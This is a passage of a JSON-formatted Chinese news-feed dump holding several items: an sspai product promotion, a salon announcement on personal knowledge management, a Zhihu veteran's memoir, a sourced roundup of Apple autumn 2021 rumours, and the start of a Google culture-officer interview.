href=\"https://item.taobao.com/item.htm?ft=t&amp;id=654443376513\" target=\"_blank\">斜挎包：</a>￥189<strong>（前 30 名购买 ￥170）</strong><s>原价 219</s>\n</li>\n<li>\n<a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=607457517577\" target=\"_blank\">少数派联名双肩包：</a>￥589<strong>（前 30 名购买 ￥554）</strong><s>原价 699</s>\n</li>\n</ul>\n<p>tomtoc 是少数派的老朋友了，之前曾经联合他们推出了 <a href=\"https://sspai.com/post/63962\" target=\"_blank\">H02 斜挎胸包</a> 的特别定制款，暗色+一抹黄的设计得到了不少朋友的喜爱，而今次我们也上架了该型号的其他颜色，相同的设计，拥有 4 种不同的颜色。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/08/14db78677fb1883374c729fe4163105b.GIF\"></figure><p>提到通勤双肩包，便不得不说到广被诟病的「程序员系列」，这一根深蒂固的刻板印象相较于对某个群体的众嘲，更多是我们在日复一日长途通勤下对「功能性」与「主流审美」两者不可兼得的无奈。</p>\n<p>但好的用料和做工是可以在满足大容量、强防护的同时也平衡产品「设计感」的途径之一。H61 便是这样一款看起来平平无奇，但摸到实物后满心惊喜的产品。它外面料绝大部分都采用的是弹道尼龙 840 材料，有着耀眼但又沉稳的哑光光泽，并且在防水涂层和电脑仓 YKK 防水拉链的加持下，确保了日常通勤时大部分场景和突发状况下的正常使用及全面保护。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2019/11/07/ca4b3011456cc9fb4259601a6e8c9cf2.jpg?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" alt=\"\"></figure><p><strong>相关体验：</strong></p>\n<ul>\n<li><a href=\"https://sspai.com/post/57318\" target=\"_blank\">或许能成为你的全能背包：少数派 x tomtoc H61 定制双肩包</a></li>\n<li><a href=\"https://sspai.com/post/63962\" target=\"_blank\">一个小包就能胜任你的日常出行：少数派 x tomtoc 斜挎胸包</a></li>\n</ul>\n<h2><strong>🏷️ 这些产品也在低价折扣 ing</strong></h2>\n<p>🧩 <a href=\"https://item.taobao.com/item.htm?id=654000666489\" target=\"_blank\">点这买计客超级华容道&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/08/article/99b69a3663c8bedceced10da084b17f0\"></figure><p>🍳 <a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=654813322413\" target=\"_blank\">点这买神田 × 绣渤意 荷叶系列炒锅&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/08/article/30a52c0f87839b05195bca5cf03030bc\"></figure><p>⌨️ <a href=\"https://item.taobao.com/item.htm?id=645015794911\" target=\"_blank\">点这买 iQunix M80 猫咪键盘&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/08/article/fe95a6ae6bbee81c695dcc3ab08b02c7\"></figure><p>🧴 <a href=\"https://sspai.taobao.com/search.htm?orderType=&amp;viewType=grid&amp;keyword=%D6%BB%C7%E1&amp;lowPrice=&amp;highPrice=\" target=\"_blank\">点这买只轻护肤系列&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/08/article/56540caa8a5913f5240303b384ffe516\"></figure><p>⌨️ <a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=635802219029\" target=\"_blank\">点这买 Keychron K2 机械键盘&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/08/article/ab7e45d79d8342f76f3ff26427b52d30\"></figure><p>👜 <a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=650605369312\" target=\"_blank\">点这买极想 Switch 挎包&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/08/article/270337ef691666f24fefc69dc5cfc913\"></figure><p>🥤 <a href=\"https://item.taobao.com/item.htm?id=639745917811\" target=\"_blank\">点这买吻吻鱼彩虹保温杯&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/08/article/dae6fa7de89b0cccdef486d90b992fca\"></figure><p>🍚 <a href=\"https://item.taobao.com/item.htm?id=640845116066\" target=\"_blank\">点这买若饭液体版&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/08/article/cce6e29608900603099c03616d52517e\"></figure><p>&gt; 关注少数派 <a href=\"https://shop549593764.taobao.com/index.htm?spm=2013.1.w5002-18497266160.2.2fa346beBU2yc8\" target=\"_blank\">官方周边淘宝店</a> / <a href=\"https://weibo.com/u/6293993963\" target=\"_blank\">@吃派的水獭</a>，了解更多新奇有趣的科技产品 🏬</p>\n<p>&gt; 提升工作效率，掌握生活技巧，来少数派 <a href=\"https://shop184770392.taobao.com/index.htm?spm=a1z10.1-c.w5002-23492264167.2.528c2ac4r8butZ\" target=\"_blank\">正版软件淘宝店</a> 看看 💾</p>\n","link":"https://sspai.com/post/68647"},{"title":"一派·在线沙龙 02：个人知识管理，你做对了吗？","date":"2021-09-08 08:59:34","description":"\n<p>在凯文·凯利的著作《必然》中，有过这样一段描述：</p>\n<blockquote><p>网络最大的吸引力就在于此：五花八门的碎片化信息以松散的方式聚集在一起。但如果缺少某种牵制的话，这些松散聚集在一起的碎片化信息，就会把人搞得晕头转向，把读者的注意力带离核心，在中心论述和观点之外的地方游荡。</p></blockquote>\n<p>虽然算不上超越时代的预言（本书出版于 2016 年），但也精确地描绘了互联网时代——特别是移动互联网——兴起之后，现代人遭遇的新困境：信息碎片化引发的注意力消散和知识焦虑。</p>\n<p>从 Evernote 到 Notion，再到近两年出现的 RoamResearch，一款又一款的笔记应用的兴起，暗喻着现代人的情绪变化。刚开始，我们是尽可能地从互联网中获取信息，保存在本地软件；而后又希望将本地数据，通过 Notion 中 「Block」的理念进行整理；以 RoamResearch 为代表的双向链接应用，则是要将数据组成完整的知识网络。</p>\n<p>如果你也尝试过个人知识管理，追逐过这样的「时尚」，在过程之中肯定会有所疑问：我真的做对了吗？个人知识管理该怎么做？它的终点又在哪里，难道过几年又要换一款软件吗？</p>\n<p>如果你对这些话题感兴趣，欢迎参加<strong> 9 月 10 日（本周五）20 点</strong>举办的「一派·在线沙龙」活动。</p>\n<p>「一派·在线沙龙」是由少数派数字工具组策划，一次以语音为载体的科技爱好者聚会。每个人都有空间在这里表达自己的态度，倾听他人的思考。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/08/e407ab284e0d43d37c783d459bc22f49.png\"></figure><p>本次在线沙龙，有幸请到了 <a href=\"https://sspai.com/series/218\">产品沉思录</a> 和 <a href=\"https://sspai.com/item/236\">flomo·浮墨笔记</a> 的创始人 <a class=\"ss-atUser\" data-mention=\"@少楠Plidezus\" user-id=\"bs2p2ttb34tch279k07g\" href=\"https://sspai.com/u/plidezus\">@少楠Plidezus</a> ，来和我们分享他对个人知识管理的思考和实践。 <a class=\"ss-atUser\" data-mention=\"@少楠Plidezus\" user-id=\"bs2p2ttb34tch279k07g\" href=\"https://sspai.com/u/plidezus\">@少楠Plidezus</a> 不仅有着极为丰富的互联网产品设计经验（更多关于少楠的 <a href=\"https://www.notion.so/Plidezus-ff9bdac2b40e4ad2be23192a8c43f5fd\">故事</a>），更是长期坚持实践个人知识管理，比最终将成果转化为实质的产品。比起任何精美排版和组织的笔记，这两款产品才是个人知识管理最好的成果展示。</p>\n<p>本次「一派·在线沙龙」活动分为三个环节：</p>\n<ul>\n<li>对谈：少数派编辑与少楠进行话题讨论；</li>\n<li>连麦：听众上麦分享自己的观点；</li>\n<li>Ask Me Anything：受邀嘉宾和少数派编辑回答听众的提问。</li>\n</ul>\n<p>如果你有想分享的内容，想参与「连麦」环节，请填写以下表单，我们会在活动开始前与您联系。</p> <p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68651"},{"title":"别离军营时，是否记得曾经许下的诺言，都实现了吗？","date":"2021-09-08 08:54:19","description":"\n<p>当兵前，我想当海军，浪花白的常服，乌黑的皮肤。</p>\n<p>入伍后，我当了陆军，橄榄绿的常服，同样乌黑的皮肤。</p>\n<p>一开始，我是一个侦察兵，我唱着《侦察兵之歌》，想像自已成为了一个水深千尺能泅渡，山高万丈敢攀登的侦察尖兵。</p>\n<p>新兵下连了，我又成了一个防化兵，手中的95式自动步枪，成了喷火器。</p>\n<p>外训了，日复一日地练据枪，肩窝这的皮肉好了又烂，烂了还没好又烂，常常和体能服训练粘一起，一次又一次地冲坡，匍匐前进，迷彩服的关节处也烂了，鞋也坏了好几双，那时我就想，我什么时候也能像老兵那样轻轻松松，一趟干完不喘气，把这该死的喷火器顶住，稳如老狗。</p>\n<p>海训了，38度的室外温度，有游泳训练，也有沙滩战术，也有渡海登岛的练习，尽管骄阳似火，但迷彩服永远保持着未干的状态，兜里怎么洗都是沙子，最盼望4点半的体能训练，这个时候可以排与排之间组织沙滩足球，输的一方100个俯卧撑。在一个开饭前的下午，我看了下镜子里的自已，竟然真的像来自非洲一般，黑里透着亮。</p>\n<p>演习也结束了，回营里了，渐渐地，我发现好像老兵们的体能也不过如此了，他们甚至跑到了我的后面。</p>\n<p>老兵退伍了，他们从一楼喝到四楼，又从四楼喝回一楼。当时我想，我退伍那天可不会喝这么多。</p>\n<p>终于，我也是老兵了，我觉得自已要做些什么，我不想成为一个混日子的，我渴望优秀，渴望胜利，看着下连的新兵，他们一口一个班长地叫着，就是我去年的模样。我跟新兵分享自已的训练经验，帮助他们调整心态，那时我想留队，成为一个职业军人，拐上架上两把枪，一把射向敌人，一把射向昨天的自已。</p>\n<p>再后来，家里出了点情况，思考再三，我还是退伍了，两年的军旅生涯，非常非常短暂，短暂到我努力回忆也就这么点事情。两年也很长，长到我的余生都将由它受益。</p>\n<p>2013年入伍，同年兵已经成为了三期老班长，曾经感觉三期是这么地远，如今，我也到了三期老班长的年龄。</p>\n<p>战友们，加油。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/cheng-wa-xin-ge?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">程瓦辛格</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/482936135/answer/2097585890?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">314 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/50436055?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">战友，退伍多年，军营对你来说是什么感觉？</a><br><a href=\"http://www.zhihu.com/question/277000809?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">送走自己的战友是什么感觉？</a><br>\n","link":"http://www.zhihu.com/question/482936135/answer/2097585890?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"高刷屏 iPhone、全面屏 iPad mini…… Apple 秋季发布会还有哪些看点？","date":"2021-09-08 08:00:00","description":"\n<p>随着凌晨的一封邀请函，今年的 Apple 秋季发布会终于确认将于北京时间 9 月 15 日凌晨 1 点举行。本次发布会依然采用录播的形式与我们见面。万众瞩目的 iPhone 13、Apple Watch Series 7 都可能会在本次发布会上与我们见面。</p>\n<p>少数派也和往年一样，为大家收集了国内外的最新情报，带你提前一睹 Apple 秋季发布会上可能会出现的新品。</p>\n<h2>iPhone 13</h2>\n<p>作为秋季发布会毫无疑问的主角，iPhone 13 自然也是许多人最期待的新品，据台湾 <a href=\"https://money.udn.com/money/story/5612/5578271\" target=\"_blank\">经济日报</a> 报道，供应链传出消息称今年的 iPhone 会以「iPhone 13」命名，而非「iPhone 12s」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/08/article/7167b857caf9c80d0bb20c41dcaedce8\"><figcaption>有用户在微博晒出疑似 iPhone 13 的包装封条（图 / 微博 <a href=\"https://weibo.com/1840918185/KvcsfxBhe\" target=\"_blank\">@科技Yu</a>）</figcaption></figure><p>除了名字外，iPhone 13 系列也可能会保留与 iPhone 12 一样的产品线，分为 iPhone 13 mini、iPhone 13、iPhone 13 Pro 和 iPhone 13 Pro Max 四种机型面向不同受众。</p>\n<h3>外观：机身更厚、刘海更小</h3>\n<p>早在今年 1 月，日本媒体 <a href=\"http://www.macotakara.jp/blog/rumor/entry-40812.html\" target=\"_blank\">Mac Otakara</a> 就曾援引中国供应链报道称 iPhone 13 会更厚、摄像头突出厚度也会增加。外媒 MacRumors 在 5 月的报道则提供了更详细的变化数据。增加了这一传言的可信度。</p>\n<p>据 <a href=\"https://www.macrumors.com/2021/05/10/iphone-13-models-larger-camera-bumps/\" target=\"_blank\">MacRumors</a> 报道，iPhone 13 系列会比 iPhone 12 系列更厚，iPhone 13 及 iPhone 13 Pro 的厚度预计将为 7.57 毫米，相比于 iPhone 12 的 7.4 毫米增加了 0.17 毫米。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/08/article/54928837496db602b5710c2420bdcf36\"><figcaption>图 / MacRumors</figcaption></figure><p>除了厚度改变外，iPhone 13 系列的相机模块也会变大，并且凸起更多。不过 iPhone 13 系列会采用与 iPad Pro 2021 相似的摄像头设计：<strong>摄像头模块凸起更多，单个摄像头凸起更少</strong>。</p>\n<p>iPhone 13 Pro 摄像头模块的凸起达到了 3.65 毫米，iPhone 13 则为 2.51 毫米，相比于 iPhone 12 及 iPhone 12 Pro 1.5 至 1.7 毫米的突出，摄像头厚度的改变可能会比整机厚度的改变更容易被感知。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/08/article/3d71b2030b6c17d31dd8a00ab9d08707\"><figcaption>图 / MacRumors</figcaption></figure><p>据科技博客 <a href=\"https://www.mysmartprice.com/gear/exclusive-iphone-13-3d-renders-reveal-smaller-notch/\" target=\"_blank\">MySmartPrice</a> 从「行业消息人士」中获取到的 iPhone 13 渲染图来看，iPhone 13 后置摄像头可能会改为对角排列的形式。从渲染图来看，iPhone 13 并没有给 LiDAR 摄像头留切口，也就是说，LiDAR 相机可能仍是 iPhone 13 Pro 系列的专属。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/08/article/ab378f26e5dbaa310bd4ffe1da64a965\"><figcaption>图 / MySmartPrice</figcaption></figure><p>此外，Mac Otakara 还称 iPhone 13 的原深感摄像头模块（即正面的刘海区域）的高度会变小，因为刘海中的部分传感器会被移动到屏幕边缘。无独有偶，早在去年 10 月，<a href=\"https://twitter.com/UniverseIce/status/1313841682463424513\" target=\"_blank\">@UniverseIce</a> 就曾在 Twitter 上爆出 iPhone 13 刘海高度会变小的消息。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/08/article/6ce5d58e0831b0dcfe35ab29fd0c700d\"><figcaption>图 / Twitter @UniverseIce</figcaption></figure><p>但从后来 <a href=\"https://twitter.com/duanrui1205/status/1383444354866372615\" target=\"_blank\">泄露的实物图</a> 来看，iPhone 13 的刘海高度并没有明显变小，反而是左右宽度有所变窄。并且实物图也印证了 iPhone 13 会将顶部扬声器移动至屏幕边缘的传言。不论是高度变小还是左右收窄，根据多方消息来看，iPhone 13 的刘海很可能真的会变小。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/08/article/826b76e90c440b2a5703a3c11b73a721\"><figcaption>图 / Twitter @duanrui1205</figcaption></figure><p>据 <a href=\"https://www.youtube.com/watch?v=rzWEEYkZjn0&amp;feature=youtu.be\" target=\"_blank\">EverythingApplePro</a> 称，iPhone 13 Pro 和 Pro Max 可能会提供哑光黑作为深空灰的替代，Apple 同时也在尝试一种橙色、接近古铜色的新配色，但可能不会在 iPhone 13 上推出。此外， iPhone 13 也为不锈钢机身边缘加入了抗指纹涂层来解决油污问题。</p>\n<p>近日，<a href=\"https://twitter.com/theapplehub/status/1434601285144047618?s=21\" target=\"_blank\">@theapplehub</a> 也在 Twitter 上晒出了疑似哑光黑配色 iPhone 13 的照片。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/08/article/5c1950bf4b6a26de4c3a1781b11680d6\"><figcaption>图 / Twitter @theapplehub</figcaption></figure><h3>屏幕：120Hz 高刷新率、LTPO 齐上阵</h3>\n<p>早在去年 iPhone 12 发布前，就已经有传言称 iPhone 12 将会搭载 LTPO 屏幕，并且很可能支持 120Hz 高刷新率。但最后我们并没能在 iPhone 12 上看到它。</p>\n<p>外媒 9to5Mac 援引郭明錤（Ming-Chi Kuo）分析称，iPhone 12 未搭载 120Hz 高刷屏的原因在于无法保证续航表现。因此，高刷 LTPO 屏会被延期至 2021 年与 iPhone 13 一同亮相。</p>\n<p>据彭博社记者 <a href=\"https://www.macrumors.com/2021/07/18/iphone-13-always-on-display/\" target=\"_blank\">Mark Gurman</a> 称，iPhone 13 可能会支持 120Hz 高刷新率，并提供类似 Apple Watch 的显示屏常亮（Always-On）功能。不过 LTPO 屏幕可能只会登陆 iPhone 13 Pro 和 iPhone 13 Pro Max。</p>\n<h3>相机：镜头升级、支持人像模式视频</h3>\n<p>作为 Apple 近几年在 iPhone 上的发力点，相机的改进也将是 iPhone 13 一个重要更新。</p>\n<p>据 <a href=\"https://www.macrumors.com/2021/01/20/sensor-shift-all-iphone-13-models-rumor/\" target=\"_blank\">MacRumors</a> 援引 DigiTimes Asia 称，iPhone 13 全系列都将在广角镜头配备传感器位移式防抖模块。此模块原本仅在 iPhone 12 Pro Max 上搭载，用于获得更好的防抖及暗光拍摄表现。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/08/1dbcd35f9696b5f9a4bdf369e4f68e41.jpg\"><figcaption>图 / MacRumors</figcaption></figure><p>Pro 系列的设备还会将该模块应用于超广角镜头。与此同时，Pro 系列设备也会对超广角镜头进行升级，新的超广角镜头将拥有 f/1.8 的光圈及自动对焦功能。</p>\n<p>此外，<a href=\"https://www.youtube.com/watch?v=FqOujNnuHBg\" target=\"_blank\">EverythingApplePro</a> 还称 iPhone 13 将会有全新的「天文摄影」功能，当 iPhone 检测到恒星或月球时，它会自动切换至「天文摄影」模式，延长曝光时间并对照片进行智能优化。</p>\n<p>据 <a href=\"https://www.bloomberg.com/news/articles/2021-08-10/apple-readies-new-iphones-with-pro-focused-camera-video-updates\" target=\"_blank\">彭博社</a> 报道，iPhone 13 还有可能支持人像模式视频的拍摄，并支持全新的 ProRes 视频拍摄。ProRes 与 ProRAW 一样，都是面向 Pro 系列设备的功能，它可以让 iPhone 拍摄更高质量的视频，并在后期提供更大的操作空间。</p>\n<h3>电池：更大的电池容量、支持 25W 快充</h3>\n<p><a href=\"https://www.macrumors.com/2021/06/01/iphone-13-larger-battery-capacities/\" target=\"_blank\">MacRumors</a> 报道称，iPhone 13 系列的电池容量相较于 iPhone 12 系列有所提升，比如 iPhone 13 mini 可能会搭载 2406 mAh 的电池，而 iPhone 13 Pro Max 则可能配备 4352 mAh 的电池。</p>\n<p>今年 6 月，有博主在 <a href=\"https://m.weibo.cn/status/4643383014066373\" target=\"_blank\">微博</a> 晒出疑似 iPhone 13 系列的电池信息图。其中电池容量最大的 A2653 型号的额定电池容量为 4352 mAh，最小的 A2660 则为 2406 mAh，与 MacRumors 的报道不谋而合。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/08/58714e749ee33bfcd7d577df7186e589.jpg\"><figcaption>疑似 iPhone 13 系列电池信息（图 / 微博 @数码闲聊站）</figcaption></figure><p>据传闻，iPhone 13 系列还可能支持最高 25W 的充电功率，Apple 也将同期上架 25W 的充电器。</p>\n<h3>更多传言：最高 1T 存储空间、支持低轨道卫星通讯</h3>\n<p>今年 2 月，外媒 9to5Mac 在 <a href=\"https://9to5mac.com/2021/02/28/report-iphone-13-to-offer-1-tb-storage-option/\" target=\"_blank\">一篇文章</a> 中表示 iPhone 13 可能会提供高达 1 TB 的存储空间选项。</p>\n<p>据郭明錤 <a href=\"https://www.macrumors.com/2021/08/29/iphone-13-to-feature-leo-to-make-calls-and-text/\" target=\"_blank\">分析</a> 称，iPhone 13 可能配备定制款的高通 X60 基带，并将支持低地球轨道卫星通信连接。此功能将允许用户在没有蜂窝数据网络连接时实现拨打电话、发送短信的功能，但可能只会在 <a href=\"https://www.macrumors.com/2021/08/30/apple-emergency-satellite-features-iphones/\" target=\"_blank\">紧急状况</a> 下使用。</p>\n<p>此外，据 <a href=\"https://www.digitimes.com/news/a20210826PD207.html\" target=\"_blank\">DigiTIimes</a> 报道称，由于台积电提高了芯片的报价，导致 iPhone 13 的生产成本增加，Apple 有可能会因此提高 iPhone 13 的售价。</p>\n<h2>Apple Watch Series 7</h2>\n<p>多方传言都表示，Apple Watch Series 7 可能会采用与 iPhone 12 类似，更方正的 <a href=\"https://9to5mac.com/2021/08/30/2021-apple-watch-renders/\" target=\"_blank\">外观设计</a>。彭博社的 <a href=\"https://9to5mac.com/2021/08/29/apple-watch-series-7-size-faces-report/\" target=\"_blank\">Mark Gurman</a> 称，Apple Watch Series 7 的尺寸将会从原本的 40 / 44 mm 提升至 41 / 45 mm，并且还会拥有全新的表盘来充分利用更大的屏幕。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/08/article/0e3f5c6a1f1f511a14d2a74018f70e45\"><figcaption>图 / MacRumors</figcaption></figure><p>Mark Gurman 也表示今年的 Apple Watch 侧重于全新的设计，很可能不会有健康方面的升级。也就是说，传闻中的血糖、血压测量和体温监测等功能或许并不会在今年与我们见面。</p>\n<p>值得一提的是，尽管 Apple Watch Series 7 会与 iPhone 13 在同一场发布会上亮相，但由于新屏幕生产遇到阻碍，Apple Watch Series 7 可能会有部分型号 <a href=\"https://9to5mac.com/2021/09/05/apple-watch-series-7-announcement-bloomberg/\" target=\"_blank\">延迟发货</a> 或少量发货。</p>\n<h2>M1X MacBook Pro</h2>\n<p>早在今年 5 月，<a href=\"https://www.bloomberg.com/news/articles/2021-05-18/apple-readies-macbook-pro-macbook-air-revamps-with-faster-chips\" target=\"_blank\">彭博社</a> 就曾报道过 Apple 计划推出全新设计的 14 / 16 英寸 MacBook Pro 的消息。但我们并未能在今年的 WWDC 上见到它的身影。</p>\n<p>今年八月，外媒 <a href=\"https://www.macrumors.com/2021/08/11/new-macbook-pro-and-apple-watch-models-spotted/\" target=\"_blank\">MacRumors</a> 在欧亚经济委员会（EEC）的公开数据库中发现了两款全新的 MacBook Pro 型号，似乎指向了可能会在今年秋季与我们见面的新款 MacBook Pro。</p>\n<p>据 <a href=\"https://www.macrumors.com/2021/08/20/digitmes-mulitple-apple-events-for-september/\" target=\"_blank\">MacRumors</a> 援引 DigiTimes 采访称，Apple 计划在今年举办多次在线活动来发布不同的新品，因此 Mac 新品可能不会与 iPhone 在同一场发布会中亮相。</p>\n<p>全新的 <a href=\"https://www.macrumors.com/2021/08/11/new-macbook-pro-and-apple-watch-models-spotted/\" target=\"_blank\">MacBook Pro</a> 可能会搭载全新的 M1X 或 M2 处理器，这枚处理器将拥有 10 核 CPU（8 颗性能核心 + 2 颗效能核心）及 16 / 32 核 GPU，并且支持最大 64G 的内存（M1 最大内存为 16G）。同时，MacBook Pro 还可能会采用 mini-LED 屏幕，并且 MagSafe 充电口和 SD 读卡器也有望回归。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/08/article/ce951fb33e600c741de7c162559121b1\"><figcaption>图 / MacRumors</figcaption></figure><p>据 <a href=\"https://www.macrumors.com/2021/06/03/16-inch-macbook-pro-regulatory-filing/\" target=\"_blank\">MacRumors</a> 报道，他们在 Apple 供应商提交给中国监管部门的资料中发现了疑似新款 MacBook Pro 的电池信息。其中 14 英寸 MacBook Pro 电池的额定容量比现有的 13 英寸版要高，而 16 英寸版则相差不大。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/08/article/5d06f136823cb3e86e858861a2630319\"><figcaption>左：14 英寸 MacBook Pro，右：16 英寸 MacBook Pro（图 / MacRumors）</figcaption></figure><p>全新 MacBook Pro 还可能在设计上有细微变化。郭明錤认为 MacBook Pro 将采用类似于 iPhone 12 的平边设计，而 Mark Gurman 则表示新的外观与当前设计看起来相似，但有细微更改。</p>\n<p>此外，郭明錤还认为 Apple 将会在 2021 年移除 Touch Bar 并替换为物理按键，Mark Gurman 也证实 Apple 已经测试了没有 Touch Bar 的 MacBook Pro。全新 MacBook Pro 还将改进散热设计，增加了导热管的尺寸从而获得更好的散热效果。</p>\n<h2>iPad mini 6</h2>\n<p>距离 Apple 上次更新 iPad mini 还是 2019 年的事情了，随着全面屏版 iPad Air 的推出，大家对全面屏 iPad mini 的呼声也越来越高。</p>\n<p>据 <a href=\"https://www.bloomberg.com/news/articles/2021-06-04/apple-working-on-ipad-pro-with-wireless-charging-new-ipad-mini\" target=\"_blank\">彭博社</a> 报道，Apple 正在开发一款全新的 iPad mini，并将采用全面屏设计。此前，<a href=\"https://9to5mac.com/2020/05/14/ipad-mini-apple-glasses-kuo/\" target=\"_blank\">9to5Mac</a> 曾援引郭明錤报告称，iPad mini 6 的屏幕尺寸预计会在 8.5 - 9 英寸。</p>\n<p>知名爆料人 <a href=\"https://www.frontpagetech.com/2021/06/11/exclusive-first-look-at-newly-redesigned-ipad-mini-6/\" target=\"_blank\">Jon Prosser</a> 曾通过多方来源做出了 iPad mini 6 的渲染图，并表示 iPad mini 6 会采用与 iPad Air 4 类似的设计，将 Touch ID 集成至电源按键并采用 USB-C 接口。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/08/article/0087ffa556bbb9abd85e4ba2d8239efe\"><figcaption>图 / frontpagetech.com</figcaption></figure><p>同时，Jon Prosser 还表示 Apple 将会为 iPad mini 6 推出一款更小的 Apple Pencil。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/08/article/6db670d96738974921a526c1176237d6\"><figcaption>新 Apple Pencil 与 Apple Pencil 2 长度对比（图 / frontpagetech.com）</figcaption></figure><h2>AirPods 3</h2>\n<p>AirPods 3 或许是众多用户期待最久的一款产品了，早在去年 10 月，<a href=\"https://www.bloomberg.com/news/articles/2020-10-26/apple-developing-smaller-airpods-pro-revamped-entry-level-model\" target=\"_blank\">彭博社</a> 就曾报道称 Apple 计划推出一款新的入门级 AirPods。在外观上，AirPods 3 将与 AirPods Pro 一样采取短柄设计，但没有耳塞。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/08/article/76978ecbeca1beb79c37227aae76a5ac\"><figcaption>图 / 52audio.com</figcaption></figure><p>据 <a href=\"https://9to5mac.com/2021/09/04/roundup-airpods-3-what-we-know/\" target=\"_blank\">9to5Mac</a> 报道，AirPods 3 虽然在外观设计上与 AirPods Pro 相似，但并不会支持主动降噪和通透模式。</p>\n<h2>iOS 15 / iPadOS 15 正式版更新</h2>\n<p>除了硬件产品外，免费的 iOS / iPadOS 15 更新也是众多用户每年所关注的焦点。今年的 iOS 15 为我们带来了全新的专注模式、实况文本和多个系统应用的大更新，iPadOS 15 则带来了更方便的快捷笔记以及与 macOS 搭配使用的 Universal Control 功能。</p>\n<p>你可以在这些文章中详细地了解 iOS / iPadOS 15：</p>\n<ul>\n<li><a href=\"https://sspai.com/post/67094\" target=\"_blank\">虽然没有传闻中的新硬件，今年依旧看点不少：WWDC 发布会回顾</a></li>\n<li><a href=\"https://sspai.com/post/67108\" target=\"_blank\">除了专注模式和实况文本，iOS 15 还有这些值得你关注的新功能</a></li>\n<li><a href=\"https://sspai.com/post/67179\" target=\"_blank\">iPadOS 15 上手体验：除了超大的小组件、快速笔记，今年还有这些新变化</a></li>\n</ul>\n<p>如果你对今年的 Apple 秋季发布会还有什么期待和想法，也不妨在评论区与我们一同交流讨论。</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68644"},{"title":"在 Google 浇灌创新文化——专访 Google 首席文化官 Stacy Sullivan","date":"2021-09-08 06:29:27","description":"\n<p>说到公司中的管理岗位，你一定对各种冠以「首席」的称呼不陌生——首席执行官（CEO）、首席财务官（CFO）、首席运营官（COO）等；随着科技公司的崛起，首席技术官（CTO）这些相对较新的头衔也愈发广为人知。</p>\n<p>但如果说到「<strong>首席文化官</strong>」（CCO），大多数人可能就不太清楚其职责何在了。更令人意外的是，最早设置 CCO 职位的公司之一，反倒是一家科技公司——Google。</p>\n<p>事实上，Google 早在 2006 年就任命了其首任、也是目前唯一一任 CCO。她就是 Stacy Savides Sullivan，一位 1999 年就加入 Google 的元老级人物，被知名科技媒体 CNET <a 